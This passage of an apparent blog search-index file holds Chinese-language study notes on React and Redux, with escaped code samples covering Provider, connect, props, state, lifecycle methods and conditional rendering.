'',\rmessages: [...this.state.messages, this.state.input]\r})\r}\rrender() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;h2\u0026gt;Type in a new Message:\u0026lt;/h2\u0026gt;\r\u0026lt;input onChange={this.handleChange.bind(this)} value={this.state.input} /\u0026gt;\r\u0026lt;button onClick={this.submitMessage.bind(this)}\u0026gt;Submit\u0026lt;/button\u0026gt;\r\u0026lt;ul\u0026gt;\r{this.state.messages.map((x, i) =\u0026gt; {\rreturn \u0026lt;li key={i}\u0026gt;{x}\u0026lt;/li\u0026gt;\r})}\r\u0026lt;/ul\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r};\r三、提取状态逻辑给 Redux 完成 React 组件后，需要把在本地 state 执行的逻辑移到 Redux 中， 这是为小规模 React 应用添加 Redux 的第一步。\n该应用的唯一功能是把用户的新消息添加到无序列表中。\n// 定义 ADD、addMessage()、messageReducer() 并在这里存储：\rconst ADD = \u0026quot;ADD\u0026quot;;\rconst addMessage = message =\u0026gt; {\rreturn {\rtype: ADD,\rmessage\r};\r};\r// 使用 ES6 默认参数给 'previous State' 参数一个初始值。\rconst messageReducer = (previousState = [], action) =\u0026gt; {\r// 使用switch语句来布局reducer逻辑以响应不同的动作类型\rswitch (action.type) {\rcase ADD:\r// 使用 ES6 扩展运算符返回一个新数组，其中将新消息添加到 previousState\rreturn [...previousState, action.message];\rbreak;\rdefault:\r// 如果 Redux 存储的更新不是针对此特定状态，则要退回到默认情况。\rreturn previousState;\r}\r};\rconst store = Redux.createStore(messageReducer);\r四、使用 Provider 链接 Redux 和 React 在上一步中，创建了 Redux store 和 action，分别用于处理消息数组和添加新消息。\n下一步要为 React 提供访问 Redux store 及发起更新所需的 actions。 react-redux 包可帮助我们完成这些任务。\nreact-redux 提供的 API 有两个关键的功能：Provider 和 connect。\nProvider 是 wrapper 组件， 它允许访问整个组件树中的 Redux store 及 dispatch（分发）方法。\nProvider 需要两个 props：Redux store 和 App 应用的子组件。\n// Redux:\rconst ADD = 'ADD';\rconst addMessage = (message) =\u0026gt; {\rreturn {\rtype: ADD,\rmessage\r}\r};\rconst messageReducer = (state = [], action) =\u0026gt; {\rswitch (action.type) {\rcase ADD:\rreturn [\r...state,\raction.message\r];\rdefault:\rreturn state;\r}\r};\rconst store = Redux.createStore(messageReducer);\r// React:\rclass DisplayMessages extends React.Component {\rconstructor(props) {\rsuper(props);\rthis.state = {\rinput: '',\rmessages: []\r}\rthis.handleChange = this.handleChange.bind(this);\rthis.submitMessage = this.submitMessage.bind(this);\r}\rhandleChange(event) {\rthis.setState({\rinput: event.target.value\r});\r}\rsubmitMessage() {\rthis.setState((state) =\u0026gt; {\rconst currentMessage = state.input;\rreturn {\rinput: '',\rmessages: state.messages.concat(currentMessage)\r};\r});\r}\rrender() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;h2\u0026gt;Type in a new Message:\u0026lt;/h2\u0026gt;\r\u0026lt;input\rvalue={this.state.input}\ronChange={this.handleChange} /\u0026gt;\u0026lt;br /\u0026gt;\r\u0026lt;button onClick={this.submitMessage}\u0026gt;Submit\u0026lt;/button\u0026gt;\r\u0026lt;ul\u0026gt;\r{this.state.messages.map((message, idx) =\u0026gt; {\rreturn (\r\u0026lt;li key={idx}\u0026gt;{message}\u0026lt;/li\u0026gt;\r)\r})\r}\r\u0026lt;/ul\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r};\rconst Provider = ReactRedux.Provider;\rclass AppWrapper extends React.Component {\r// 在这一行下面渲染 Provider\rrender() {\rreturn (\r\u0026lt;Provider store={store}\u0026gt;\r\u0026lt;DisplayMessages /\u0026gt;\r\u0026lt;/Provider\u0026gt;\r);\r}\r};\r五、映射 State 到 Props Provider 可向 React 组件提供 state 和 dispatch ，但必须确切地指定所需要的 state 和 actions， 以确保每个组件只能访问所需的 state。\n完成这个任务，需要创建两个函数：mapStateToProps()、mapDispatchToProps()。\n在这两个函数中，声明 state 中函数所要访问的部分及需要 dispatch 的创建 action 的函数。\n注意： 在幕后，React Redux 用 store.subscribe() 方法来实现 mapStateToProps()。\nconst state = [];\rconst mapStateToProps = (state)=\u0026gt;{\rreturn {\rmessages: state\r}\r}\r六、映射 Dispatch 到 Props mapDispatchToProps() 函数可为 React 组件提供特定的创建 action 的函数，以便组件可 dispatch actions，从而更改 Redux store 中的数据。\n该函数的结构跟上一步中的mapStateToProps()函数相似， 它返回一个对象，把 dispatch actions 映射到属性名上，该属性名成为props。\n然而，每个属性都返回一个用 action creator 及与 action 相关的所有数据调用 dispatch 的函数，而不是返回 state 的一部分。\n可以访问 dispatch，因为在定义函数时，我们以参数形式把它传入 mapDispatchToProps() 了，这跟 state 传入 mapStateToProps() 是一样的。\n在幕后，React Redux 用 Redux 的 store.dispatch() 来管理这些含 mapDispatchToProps() 的dispatches， 这跟它使用 store.subscribe() 来订阅映射到 state 的组件的方式类似。\nconst addMessage = (message) =\u0026gt; {\rreturn {\rtype: 'ADD',\rmessage: message\r}\r};\rconst mapDispatchToProps = (dispatch) =\u0026gt; {\rreturn {\rsubmitNewMessage: (message) =\u0026gt; {\rdispatch(addMessage(message))\r}\r}\r}\r七、连接 Redux 和 React 已经写了mapStateToProps()、mapDispatchToProps() 两个函数，现在可以用它们来把 state 和 dispatch 映射到 React 组件的 props 了。\nReact Redux 的 connect 方法可以完成这个任务。\n此方法有 mapStateToProps()、mapDispatchToProps() 两个可选参数， 它们是可选的，原因是你的组件可能仅需要访问 state 但不需要分发任何 actions，反之亦然。\nconst addMessage = (message) =\u0026gt; {\rreturn {\rtype: 'ADD',\rmessage: message\r}\r};\rconst mapStateToProps = (state) =\u0026gt; {\rreturn {\rmessages: state\r}\r};\rconst mapDispatchToProps = (dispatch) =\u0026gt; {\rreturn {\rsubmitNewMessage: (message) =\u0026gt; {\rdispatch(addMessage(message));\r}\r}\r};\rclass Presentational extends React.Component {\rconstructor(props) {\rsuper(props);\r}\rrender() {\rreturn \u0026lt;h3\u0026gt;This is a Presentational Component\u0026lt;/h3\u0026gt;\r}\r};\rconst connect = ReactRedux.connect;\r// 添加这行下面的代码\rconst ConnectedComponent = connect(mapStateToProps, mapDispatchToProps)(Presentational)\r八、将 Redux 链接到 Messages App 在上一步，连接到 Redux 的组件命名为 Presentational，这个命名不是任意的， 这样的术语通常是指未直接连接到 Redux 的 React 组件， 它们只负责执行接收 props 的函数来实现 UI 的呈现。\n相比之下，容器组件用来连接到 Redux 上。 这些组件通常负责把 actions 分派给 store，且经常给子组件传入 store state 属性。\n// Redux:\rconst ADD = 'ADD';\rconst addMessage = (message) =\u0026gt; {\rreturn {\rtype: ADD,\rmessage: message\r}\r};\rconst messageReducer = (state = [], action) =\u0026gt; {\rswitch (action.type) {\rcase ADD:\rreturn [\r...state,\raction.message\r];\rdefault:\rreturn state;\r}\r};\rconst store = Redux.createStore(messageReducer);\r// React:\rclass Presentational extends React.Component {\rconstructor(props) {\rsuper(props);\rthis.state = {\rinput: '',\rmessages: []\r}\rthis.handleChange = this.handleChange.bind(this);\rthis.submitMessage = this.submitMessage.bind(this);\r}\rhandleChange(event) {\rthis.setState({\rinput: event.target.value\r});\r}\rsubmitMessage() {\rthis.setState((state) =\u0026gt; {\rconst currentMessage = state.input;\rreturn {\rinput: '',\rmessages: state.messages.concat(currentMessage)\r};\r});\r}\rrender() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;h2\u0026gt;Type in a new Message:\u0026lt;/h2\u0026gt;\r\u0026lt;input\rvalue={this.state.input}\ronChange={this.handleChange} /\u0026gt;\u0026lt;br /\u0026gt;\r\u0026lt;button onClick={this.submitMessage}\u0026gt;Submit\u0026lt;/button\u0026gt;\r\u0026lt;ul\u0026gt;\r{this.state.messages.map((message, idx) =\u0026gt; {\rreturn (\r\u0026lt;li key={idx}\u0026gt;{message}\u0026lt;/li\u0026gt;\r)\r})\r}\r\u0026lt;/ul\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r};\r// React-Redux:\rconst mapStateToProps = (state) =\u0026gt; {\rreturn { messages: state }\r};\rconst mapDispatchToProps = (dispatch) =\u0026gt; {\rreturn {\rsubmitNewMessage: (newMessage) =\u0026gt; {\rdispatch(addMessage(newMessage))\r}\r}\r};\rconst Provider = ReactRedux.Provider;\rconst connect = ReactRedux.connect;\r// 在这里定义 Container 组件：\rconst Container = connect(mapStateToProps, mapDispatchToProps)(Presentational)\rclass AppWrapper extends React.Component {\rconstructor(props) {\rsuper(props);\r}\rrender() {\r// 完成 return 语句\rreturn (\r\u0026lt;Provider store={store}\u0026gt;\r\u0026lt;Container /\u0026gt;\r\u0026lt;/Provider\u0026gt;\r);\r}\r};\r九、将局部状态提取到 Redux 中 现在有了连接好的 Redux，还要从Presentational组件中提取状态管理到 Redux， 目前，已连接 Redux，但正在 Presentational 组件中本地处理状态。\n// Redux:\rconst ADD = 'ADD';\rconst addMessage = (message) =\u0026gt; {\rreturn {\rtype: ADD,\rmessage: message\r}\r};\rconst messageReducer = (state = [], action) =\u0026gt; {\rswitch (action.type) {\rcase ADD:\rreturn [\r...state,\raction.message\r];\rdefault:\rreturn state;\r}\r};\rconst store = Redux.createStore(messageReducer);\r// React:\rconst Provider = ReactRedux.Provider;\rconst connect = ReactRedux.connect;\r// 修改这行下面的代码\rclass Presentational extends React.Component {\rconstructor(props) {\rsuper(props);\r// Remove property 'messages' from Presentational's local state\rthis.state = {\rinput: ''\r}\rthis.handleChange = this.handleChange.bind(this);\rthis.submitMessage = this.submitMessage.bind(this);\r}\rhandleChange(event) {\rthis.setState({\rinput: event.target.value\r});\r}\rsubmitMessage() {\r// Call 'submitNewMessage', which has been mapped to Presentational's props, with a new message;\r// meanwhile, remove the 'messages' property from the object returned by this.setState().\rthis.props.submitNewMessage(this.state.input);\rthis.setState({\rinput: ''\r});\r}\rrender() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;h2\u0026gt;Type in a new Message:\u0026lt;/h2\u0026gt;\r\u0026lt;input\rvalue={this.state.input}\ronChange={this.handleChange} /\u0026gt;\u0026lt;br /\u0026gt;\r\u0026lt;button onClick={this.submitMessage}\u0026gt;Submit\u0026lt;/button\u0026gt;\r\u0026lt;ul\u0026gt;\r{/* The messages state is mapped to Presentational's props; therefore, when rendering,\ryou should access the messages state through props, instead of Presentational's\rlocal state. */}\r{this.props.messages.map((message, idx) =\u0026gt; {\rreturn (\r\u0026lt;li key={idx}\u0026gt;{message}\u0026lt;/li\u0026gt;\r)\r})\r}\r\u0026lt;/ul\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r};\r// 修改这行上面的代码\rconst mapStateToProps = (state) =\u0026gt; {\rreturn { messages: state }\r};\rconst mapDispatchToProps = (dispatch) =\u0026gt; {\rreturn {\rsubmitNewMessage: (message) =\u0026gt; {\rdispatch(addMessage(message))\r}\r}\r};\rconst Container = connect(mapStateToProps, mapDispatchToProps)(Presentational);\rclass AppWrapper extends React.Component {\rrender() {\rreturn (\r\u0026lt;Provider store={store}\u0026gt;\r\u0026lt;Container /\u0026gt;\r\u0026lt;/Provider\u0026gt;\r);\r}\r};\r","description":" Redux 和 React 的配合，由于Redux的编写方式太过于沉重，而且现在有了Hooks，完全可以抛弃沉重的Redux，可以使用Hooks的useReducer编写复杂的逻辑。","id":20,"section":"react","tags":null,"title":"React \u0026 Redux","uri":"https://danacoding.github.io/react/redux/react-redux/"},{"content":"简介：React 是由 Facebook 创建和维护的开源视图库。 它是渲染现代 Web 应用程序用户界面（UI）的好工具。\n一、JSX（JS 语法扩展） React 使用名为 JSX 的 JavaScript 语法扩展，可以直接在 JavaScript 中编写 HTML。\n这有几个好处。 可以在 HTML 中使用 JavaScript 的完整程序功能，并有助于保持代码的可读性。\n在大多数情况下，JSX 类似于 HTML，但是涉及一些关键差异。\n例如，因为 JSX 是 JavaScript 的语法扩展，所以实际上可以直接在 JSX 中编写 JavaScript。\n要做到这一点，只需在花括号中包含希望被视为 JavaScript 的代码：{ \u0026lsquo;this is treated as JavaScript code\u0026rsquo; }（这被视为 JavaScript 代码）。\n但是，由于浏览器不能解析 JSX，因此必须将 JSX 代码编译为 JavaScript。 在这个过程中，转换器 Babel 是一个很受欢迎的工具。\n值得注意的是，底层调用 ReactDOM.render(JSX, document.getElementById(\u0026lsquo;root\u0026rsquo;))。 这个函数调用将 JSX 置于 React 自己的轻量级 DOM 中。 然后，React 使用自己的 DOM 快照来实现增量更新。\nconst JSX = \u0026lt;h1\u0026gt;Hello JSX!\u0026lt;/h1\u0026gt;;\rconst JSX = \u0026lt;div\u0026gt;\r\u0026lt;h1\u0026gt;Heading.\u0026lt;/h1\u0026gt;\r\u0026lt;p\u0026gt;Paragraph\u0026lt;/p\u0026gt;\r\u0026lt;ul\u0026gt;\r\u0026lt;li\u0026gt;Coffee\u0026lt;/li\u0026gt;\r\u0026lt;li\u0026gt;Tea\u0026lt;/li\u0026gt;\r\u0026lt;li\u0026gt;Milk\u0026lt;/li\u0026gt;\r\u0026lt;/ul\u0026gt;\r\u0026lt;/div\u0026gt;;\r{/*\u0026lt;h1\u0026gt;Hanoi University of Science\u0026lt;/h1\u0026gt;*/}\rReact 渲染 API ReactDOM.render(ReactNode,document.getElementById('root'))\r--\u0026gt; Babel转换器\r--\u0026gt; JavaScript\r--\u0026gt; Browser\rHTML 属性和事件使用驼峰式写法 const JSX = (\r\u0026lt;div className='myDiv'\u0026gt;\r\u0026lt;h1\u0026gt;Add a class to this div\u0026lt;/h1\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r返回单个元素（即只有一个父元素包裹所有子元素） 在 JSX 中编写 JS 代码使用花括号：{ ... } 或 {*/ 注释 /*} const JSX = (\r\u0026lt;div\u0026gt;\r{/* remove comment and change code below this line // Remember that comments in JSX have parentheses.\r\u0026lt;h2\u0026gt;Welcome to React!\u0026lt;/h2\u0026gt; \u0026lt;br \u0026gt; // ?\r\u0026lt;p\u0026gt;Be sure to close all tags!\u0026lt;/p\u0026gt;\r\u0026lt;hr \u0026gt; // ?\rremove comment and change code above this line */}{\u0026quot; \u0026quot;}\r// Remember that comments in JSX have parentheses.\r\u0026lt;/div\u0026gt;\r);\rJSX 的所有标签都可以自闭合：\u0026lt;div/\u0026gt; const JSX = (\r\u0026lt;div\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r//or\rconst JSX = (\r\u0026lt;div/\u0026gt;\r);\r二、Component 组件(大写字母开头定义) 组件是 React 的核心。 React 中的所有内容都是一个组件。\n有两种方法可以创建 React 组件。\n第一种方法是使用 JavaScript 函数。 以这种方式定义组件会创建无状态功能组件（Hooks 组件可以有状态）。\n要用函数创建组件，只需编写一个返回 JSX 或 null 的 JavaScript 函数。 需要注意的一点是，React 要求你的函数名以大写字母开头。\n1. 无状态组件（Hook中称为函数组件） function MyComponent(){\rreturn(\r\u0026lt;div\u0026gt;Completed challenge!\u0026lt;/div\u0026gt; //记得返回JSX\r);\r}\r2. class 组件 （ES6 语法糖） class Kitten extends React.Component {\rconstructor(props) {\rsuper(props); //super(props)作用是调用父类的构造函数React.Component\r}\rrender() {//render(): 渲染JSX的方法\rreturn (\r\u0026lt;h1\u0026gt;Hi\u0026lt;/h1\u0026gt;\r);\r}\r}\r3. 组合/嵌套组件 //将子组件放入父组件中\rclass Fruits extends React.Component {\rconstructor(props) {\rsuper(props);\r}\rrender() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;h2\u0026gt;Fruits:\u0026lt;/h2\u0026gt;\r\u0026lt;NonCitrus /\u0026gt;\r\u0026lt;Citrus /\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r};\rclass TypesOfFood extends React.Component {\rconstructor(props) {\rsuper(props);\r}\rrender() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;h1\u0026gt;Types of Food:\u0026lt;/h1\u0026gt;\r\u0026lt;Fruits /\u0026gt;\r\u0026lt;Vegetables /\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r};\r三、props 1. 传递方式 \u0026ndash; 单向数据流 在 React 中，可以将属性传递给子组件。单向数据流\nfunction 组件\nconst CurrentDate = (props) =\u0026gt; {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;p\u0026gt;The current date is: {props.date}\u0026lt;/p\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r};\rclass Calendar extends React.Component {\rconstructor(props) {\rsuper(props);\r}\rrender() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;h3\u0026gt;What date is it?\u0026lt;/h3\u0026gt;\r\u0026lt;CurrentDate date={Date()} /\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r};\rclass 组件\nclass App extends React.Component {\rconstructor(props) {\rsuper(props);\r}\rrender() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;Welcome name=\u0026quot;Jessica\u0026quot;/\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r};\rclass Welcome extends React.Component {\rconstructor(props) {\rsuper(props);\r}\rrender() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;p\u0026gt;Hello, \u0026lt;strong\u0026gt;{this.props.name}\u0026lt;/strong\u0026gt;!\u0026lt;/p\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r};\r2. 默认 props React 还有一个设置默认 props 的选项。\n可以将默认 props 作为组件本身的属性分配给组件，React 会在必要时分配默认 prop。\n如果没有显式的提供任何值，这允许指定 prop 值应该是什么。\nconst ShoppingCart = (props) =\u0026gt; {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;h1\u0026gt;Shopping Cart Component\u0026lt;/h1\u0026gt;\r\u0026lt;/div\u0026gt;\r)\r};\rShoppingCart.defaultProps = {\ritems: 0\r};\r3. propTypes \u0026amp; PropTypes React 提供了有用的类型检查特性，以验证组件是否接收了正确类型的 props。\n例如，应用程序调用 API 来检索数据是否是数组，然后将数据作为 prop 传递给组件。\n可以在组件上设置 propTypes，以要求数据的类型为 array。 当数据是任何其它类型时，都会抛出警告。\nconst Items = (props) =\u0026gt; {\rreturn \u0026lt;h1\u0026gt;Current Quantity of Items in Cart: {props.quantity}\u0026lt;/h1\u0026gt;\r};\rItems.propTypes = {\rquantity: PropTypes.number.isRequired //其中number为类型；isRequired为必须\r};\rItems.defaultProps = {\rquantity: 0\r};\rclass ShoppingCart extends React.Component {\rconstructor(props) {\rsuper(props);\r}\rrender() {\rreturn \u0026lt;Items /\u0026gt;\r}\r};\r四、state React 中最重要的主题之一是 state。\nstate 包含应用程序需要了解的任何数据，这些数据可能会随时间而变化。\n应用程序能够响应 state 的变更，并在必要时显示更新后的 UI。\nReact 为现代 Web 应用程序的状态管理提供了一个很好的解决方案。\n可以在类组件的 constructor 上声明 state 属性来在 React 组件中创建 state， 它在创建时使用 state 初始化组件。\nstate 属性必须设置为 JavaScript object（对象）\n1. 初始化状态this.state={} class StatefulComponent extends React.Component {\rconstructor(props) {\rsuper(props);\rthis.state = {\rname: \u0026quot;Name\u0026quot;\r}\r}\rrender() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;h1\u0026gt;{this.state.name}\u0026lt;/h1\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r};\r2. 设置状态this.setState() React 要求永远不要直接修改 state，而是在 state 发生改变时始终使用 this.setState()。\n此外，应该注意，React 可以批量处理多个 state 更新以提高性能。\n这意味着通过 setState 方法进行的 state 更新可以是异步的。\nclass MyComponent extends React.Component {\rconstructor(props) {\rsuper(props);\rthis.state = {\rname: 'Initial State'\r};\rthis.handleClick = this.handleClick.bind(this);\r}\rhandleClick() {\rthis.setState({\rname: 'React Rocks!'\r});\r}\rrender() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;button onClick={this.handleClick}\u0026gt;Click Me\u0026lt;/button\u0026gt;\r\u0026lt;h1\u0026gt;{this.state.name}\u0026lt;/h1\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r};\r3. 使用 state 切换元素 有时可能在更新状态的时候想知道上一个状态是什么。\n但是状态更新是异步的，这意味着 React 可能会把多个 setState() 集中在一起批量更新。\n所以计算下一个值时 this.state 或者 this.props 不能作为当前值。\n正确的做法是，给 setState 传入一个函数，这个函数可以访问 state 和 props。 给 setState 传入函数可以保证 state 和 props 是正确的值。\nclass MyComponent extends React.Component {\rconstructor(props) {\rsuper(props);\rthis.state = {\rvisibility: false\r};\rthis.toggleVisibility = this.toggleVisibility.bind(this);\r}\rtoggleVisibility() {\rthis.setState(state =\u0026gt; {\rif (state.visibility === true) {\rreturn { visibility: false };\r} else {\rreturn { visibility: true };\r}\r});\r}\rrender() {\rif (this.state.visibility) {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;button onClick={this.toggleVisibility}\u0026gt;Click Me\u0026lt;/button\u0026gt;\r\u0026lt;h1\u0026gt;Now you see me!\u0026lt;/h1\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r} else {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;button onClick={this.toggleVisibility}\u0026gt;Click Me\u0026lt;/button\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r}\r}\r五、将 this 绑定到 class 方法上 为组件类定义方法。 类方法通常需要使用 this 关键字，以便它可以访问方法中类的属性（例如 state 和 props）。 有几种方法可以让类方法访问 this。\n一种常见的方法是在构造函数中显式地绑定 this，这样当组件初始化时，this 就会绑定到类方法。\n在构造函数中的 handleClick 方法使用了 this.handleClick = this.handleClick.bind(this)。 然后，当在类方法中调用像 this.setState() 这样的函数时，this 指的是这个类，而不是 undefined。\n注意： this 关键字是 JavaScript 中最令人困惑的方面之一，但它在 React 中扮演着重要的角色。\nclass MyComponent extends React.Component {\rconstructor(props) {\rsuper(props);\rthis.state = {\rtext: \u0026quot;Hello\u0026quot;\r};\rthis.handleClick = this.handleClick.bind(this);\r}\rhandleClick() {\rthis.setState({\rtext: \u0026quot;You clicked!\u0026quot;\r});\r}\rrender() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;button onClick={this.handleClick}\u0026gt;Click Me\u0026lt;/button\u0026gt;\r\u0026lt;h1\u0026gt;{this.state.text}\u0026lt;/h1\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r};\r六、将 state 作为 props 传递给子组件（重要） 有状态组件中包含对应用程序很重要的 state，然后用它渲染子组件。 如果想让这些组件能够访问该 state 的某些部分，就把这些部分作为 props 传入。\n这个模式说明了 React 中的一些重要范例。\n第一个是单向数据流， state 沿着应用程序组件树的一个方向流动，从有状态父组件到子组件， 子组件只接收它们需要的 state 数据。\n第二，复杂的有状态应用程序可以分解成几个，或者可能是一个单一的有状态组件。 其余组件只是从父组件简单的接收 state 作为 props，并从该 state 渲染 UI。\n它开始创建一种分离，在这种分离中，state 管理在代码的一部分中处理，而 UI 渲染在另一部分中处理。 将 state 逻辑与 UI 逻辑分离是 React 的关键原则之一。\n当它被正确使用时，它使得复杂的、有状态的应用程序的设计变得更容易管理。\nclass MyApp extends React.Component {\rconstructor(props) {\rsuper(props);\rthis.state = {\rinputValue: ''\r}\rthis.handleChange = this.handleChange.bind(this);\r}\rhandleChange(event) {\rthis.setState({\rinputValue: event.target.value\r});\r}\rrender() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;GetInput\rinput={this.state.inputValue}\rhandleChange={this.handleChange}/\u0026gt;\r\u0026lt;RenderInput\rinput={this.state.inputValue}/\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r};\rclass GetInput extends React.Component {\rconstructor(props) {\rsuper(props);\r}\rrender() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;h3\u0026gt;Get Input:\u0026lt;/h3\u0026gt;\r\u0026lt;input\rvalue={this.props.input}\ronChange={this.props.handleChange}/\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r};\rclass RenderInput extends React.Component {\rconstructor(props) {\rsuper(props);\r}\rrender() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;h3\u0026gt;Input Render:\u0026lt;/h3\u0026gt;\r\u0026lt;p\u0026gt;{this.props.input}\u0026lt;/p\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r};\r七、生命周期方法/钩子 React 组件有几种特殊方法，可以在组件生命周期的特定点执行操作。 这些称为生命周期方法或生命周期钩子，允许在特定时间点捕获组件。\n这可以在渲染之前、更新之前、接收 props 之前、卸载之前等等。\n以下是一些主要生命周期方法的列表：\ncomponentWillMount() 渲染之前\ncomponentDidMount() 接收 props 之前\nshouldComponentUpdate() 更新之前\ncomponentDidUpdate() 更新之后\ncomponentWillUnmount() 卸载之前\n1. componentWillMount 当组件被挂载到 DOM 时，componentWillMount() 方法在 render() 方法之前被调用。\nclass MyComponent extends React.Component {\rconstructor(props) {\rsuper(props);\r}\rcomponentWillMount() {\rconsole.log('Component being mounted');\r}\rrender() {\rreturn \u0026lt;div /\u0026gt;\r}\r};\r2. componentDidMount React 的最佳实践是在生命周期方法 componentDidMount() 中对服务器进行 API 调用或任何其它调用。\n将组件装载到 DOM 后会调用此方法。 此处对 setState() 的任何调用都将触发组件的重新渲染。\n在此方法中调用 API 并用 API​​ 返回的数据设置 state 时，一旦收到数据，它将自动触发更新。\nclass MyComponent extends React.Component {\rconstructor(props) {\rsuper(props);\rthis.state = {\ractiveUsers: null\r};\r}\rcomponentDidMount() {\rsetTimeout(() =\u0026gt; {\rthis.setState({\ractiveUsers: 1273\r});\r}, 2500);\r}\rrender() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;h1\u0026gt;Active Users: {this.state.activeUsers}\u0026lt;/h1\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r}\r3. 添加事件侦听器 componentDidMount() 方法是添加特定功能所需的任何事件监听器的最佳位置。\nReact 提供了一个合成事件系统，它封装了浏览器中的事件系统。 这意味着，不管用户用的是什么浏览器，合成事件系统的行为都完全相同 \u0026ndash; 即使不同浏览器之间的本地事件的行为可能不同。\n之前已经接触了一些合成事件处理程序，如 onClick()。 React 的合成事件系统非常适合用于在 DOM 元素上管理的大多数交互。 但是，如果要将事件处理程序附加到 document 或 window 对象，则必须直接执行此操作。\nclass MyComponent extends React.Component {\rconstructor(props) {\rsuper(props);\rthis.state = {\rmessage: ''\r};\rthis.handleEnter = this.handleEnter.bind(this);\rthis.handleKeyPress = this.handleKeyPress.bind(this);\r}\rcomponentDidMount() {\rdocument.addEventListener(\u0026quot;keydown\u0026quot;, this.handleKeyPress);\r}\rcomponentWillUnmount() {\rdocument.removeEventListener(\u0026quot;keydown\u0026quot;, this.handleKeyPress);\r}\rhandleEnter() {\rthis.setState((state) =\u0026gt; ({\rmessage: state.message + 'You pressed the enter key! '\r}));\r}\rhandleKeyPress(event) {\rif (event.keyCode === 13) {\rthis.handleEnter();\r}\r}\rrender() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;h1\u0026gt;{this.state.message}\u0026lt;/h1\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r};\r4. 使用 shouldComponentUpdate 优化重新渲染 当子组件接收到新的 state 或 props 时，可以调用该方法，并特别声明组件是否应该更新。\n它将 nextProps 和 nextState 作为参数。\n这种方法是优化性能的有效方法。 例如，默认行为是，当组件接收到新的 props 时，即使 props 没有改变，它也会重新渲染。\n可以通过使用 shouldComponentUpdate() 比较 props 来防止这种情况发生。\n该方法必须返回一个 boolean（布尔值），该值告诉 React 是否更新组件。 可以比较当前的 props（this.props）和下一个 props（nextProps），以确定你是否需要更新，并相应地返回 true 或 false。\nclass OnlyEvens extends React.Component {\rconstructor(props) {\rsuper(props);\r}\rshouldComponentUpdate(nextProps, nextState) {\rconsole.log('Should I update?');\rif (nextProps.value % 2 == 0) {\rreturn true;\r}\rreturn false;\r}\rcomponentDidUpdate() {\rconsole.log('Component re-rendered.');\r}\rrender() {\rreturn \u0026lt;h1\u0026gt;{this.props.value}\u0026lt;/h1\u0026gt;;\r}\r}\rclass Controller extends React.Component {\rconstructor(props) {\rsuper(props);\rthis.state = {\rvalue: 0\r};\rthis.addValue = this.addValue.bind(this);\r}\raddValue() {\rthis.setState(state =\u0026gt; ({\rvalue: state.value + 1\r}));\r}\rrender() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;button onClick={this.addValue}\u0026gt;Add\u0026lt;/button\u0026gt;\r\u0026lt;OnlyEvens value={this.state.value} /\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r}\r八、CSS 样式（驼峰写法） 1. 内联样式 class Colorful extends React.Component {\rrender() {\rreturn (\r\u0026lt;div style={{ color: 'red', fontSize: '72'}}\u0026gt;\rBig Red\r\u0026lt;/div\u0026gt;\r);\r}\r};\r2. 常量引用 const styles = {\rcolor: 'purple',\rfontSize: 40,\rborder: \u0026quot;2px solid purple\u0026quot;,\r};\rclass Colorful extends React.Component {\rrender() {\rreturn (\r\u0026lt;div style={styles}\u0026gt;Style Me!\u0026lt;/div\u0026gt;\r);\r}\r};\r九、按条件渲染组件 1. if\u0026hellip;else.. class MyComponent extends React.Component {\rconstructor(props) {\rsuper(props);\rthis.state = {\rdisplay: true\r}\rthis.toggleDisplay = this.toggleDisplay.bind(this);\r}\rtoggleDisplay() {\rthis.setState((state) =\u0026gt; ({\rdisplay: !state.display\r}));\r}\rrender() {\rif (this.state.display) {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;button onClick={this.toggleDisplay}\u0026gt;Toggle Display\u0026lt;/button\u0026gt;\r\u0026lt;h1\u0026gt;Displayed!\u0026lt;/h1\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r} else {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;button onClick={this.toggleDisplay}\u0026gt;Toggle 